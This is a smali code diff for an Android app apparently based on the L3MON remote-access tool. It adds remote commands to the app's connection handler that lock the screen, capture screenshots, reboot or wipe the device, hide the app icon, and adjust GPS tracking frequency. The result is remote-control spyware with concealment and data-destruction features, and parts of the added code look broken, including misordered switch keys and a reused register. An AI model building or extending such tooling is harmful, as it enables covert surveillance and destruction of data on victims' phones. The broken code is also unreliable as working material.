@@ -187,12 +187,119 @@
     invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v4
-    :try_end_0
-    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
     if-eqz v4, :cond_0
 
     const/4 v3, 0x2
+
+    goto :goto_0
+
+    :sswitch_a # NEW: 0xLK
+    const-string v4, "0xLK"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xa
+
+    goto :goto_0
+
+    :sswitch_b # NEW: 0xSC
+    const-string v4, "0xSC"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xb
+
+    goto :goto_0
+
+    :sswitch_c # NEW: 0xVB
+    const-string v4, "0xVB"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xc
+
+    goto :goto_0
+
+    :sswitch_d # NEW: 0xRB
+    const-string v4, "0xRB"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xd
+
+    goto :goto_0
+
+    :sswitch_e # NEW: 0xWD
+    const-string v4, "0xWD"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xe
+
+    goto :goto_0
+
+    :sswitch_f # NEW: 0xHO
+    const-string v4, "0xHO"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xf
+
+    goto :goto_0
+
+    :sswitch_10 # NEW: 0xSO
+    const-string v4, "0xSO"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0x10
+
+    goto :goto_0
+
+    :sswitch_11 # NEW: 0xGF (GPS Frequency)
+    const-string v4, "0xGF"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0x11
+
+    goto :goto_0
+
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
     :goto_0
     const-string v4, "ls"
@@ -200,6 +307,93 @@
     const-string v6, "action"
 
     packed-switch v3, :pswitch_data_0
+
+    :goto_default
+    goto/16 :goto_1
+
+    :pswitch_a # NEW: Lock Device
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->lockScreen(Landroid/content/Context;)V
+
+    goto/16 :goto_1
+
+    :pswitch_b # NEW: Screenshot (MDMActivity)
+    new-instance v0, Landroid/content/Intent;
+
+    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    const-class v2, Lcom/etechd/l3mon/MDMActivity;
+
+    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const-string v1, "action"
+
+    const-string v2, "screenshot"
+
+    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    const/high16 v1, 0x10000000
+
+    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    goto/16 :goto_1
+
+    :pswitch_c # NEW: Vibrate
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    const-wide/16 v1, 0x3e8
+
+    invoke-static {v0, v1, v2}, Lcom/etechd/l3mon/MDMActionHandler;->vibrate(Landroid/content/Context;J)V
+
+    goto/16 :goto_1
+
+    :pswitch_d # NEW: Reboot
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->reboot(Landroid/content/Context;)V
+
+    goto/16 :goto_1
+
+    :pswitch_e # NEW: Wipe Data
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->wipeData(Landroid/content/Context;)V
+
+    goto/16 :goto_1
+
+    :pswitch_f # NEW: Hide Icon
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    const/4 v1, 0x0
+
+    invoke-static {v0, v1}, Lcom/etechd/l3mon/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V
+
+    goto/16 :goto_1
+
+    :pswitch_10 # NEW: Show Icon
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    const/4 v1, 0x1
+
+    invoke-static {v0, v1}, Lcom/etechd/l3mon/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V
+
+    goto/16 :goto_1
+
+    :pswitch_11 # NEW: GPS Frequency
+    const-string v0, "minTime"
+
+    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J
+
+    move-result-wide v0
+
+    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-static {v2, v0, v1}, Lcom/etechd/l3mon/LocManager;->setFrequency(Landroid/content/Context;J)V
 
     goto/16 :goto_1
 
@@ -399,11 +593,19 @@
         0x179d0b -> :sswitch_7
         0x179d31 -> :sswitch_6
         0x179d6d -> :sswitch_5
+        0x179dc7 -> :sswitch_a
         0x179dcb -> :sswitch_4
         0x179de4 -> :sswitch_3
         0x179e45 -> :sswitch_2
+        0x179e98 -> :sswitch_b
         0x179ea2 -> :sswitch_1
+        0x179ef4 -> :sswitch_c
         0x179f1a -> :sswitch_0
+        0x179e5a -> :sswitch_d # 0xRB
+        0x179f0c -> :sswitch_e # 0xWD
+        0x179d89 -> :sswitch_f # 0xHO
+        0x179e8d -> :sswitch_10 # 0xSO
+        0x179d27 -> :sswitch_11 # 0xGF
     .end sparse-switch
 
     :pswitch_data_0
@@ -418,5 +620,13 @@
         :pswitch_2
         :pswitch_1
         :pswitch_0
+        :pswitch_a
+        :pswitch_b
+        :pswitch_c
+        :pswitch_d
+        :pswitch_e
+        :pswitch_f
+        :pswitch_10
+        :pswitch_11
     .end packed-switch
 .end method
